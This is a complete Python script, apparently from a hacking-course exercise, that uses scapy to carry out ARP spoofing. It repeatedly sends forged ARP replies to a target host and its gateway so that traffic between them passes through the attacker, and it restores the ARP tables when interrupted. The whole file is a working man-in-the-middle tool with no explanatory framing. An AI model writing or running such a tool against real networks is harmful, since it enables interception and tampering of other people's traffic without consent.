#!/usr/bin/env python
import sys
import time

import scapy.all as scapy

def get_mac(ip):
    #use ARP to ask who has target IP
    arp_request = scapy.ARP(pdst=ip)
    #set destination MAC to brodcast MAC
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')#instance of internet
    arp_request_broadcast = broadcast/arp_request
    #enviar el paquete y recibir la respuesta
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    #extract list(array)
    return answered_list[0][1].hwsrc



def spoof(target_ip, spoof_ip):
    #get target mac
    target_mac = get_mac(target_ip)
    # redirect packets ARP response, destination ip, hardware destination, source ip (router)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip, hwdst= destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = '192.168.139.130'
gateway_ip = '192.168.139.2'

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip )
        sent_packets_count = sent_packets_count +2
        #carrige return para que escriba al comienzo
        print('\r[+] packes sent: ' + str(sent_packets_count), end='')#dont ad enithin at the ends
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[-] Detect CTR + C ... Resetting ARP tables .....')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


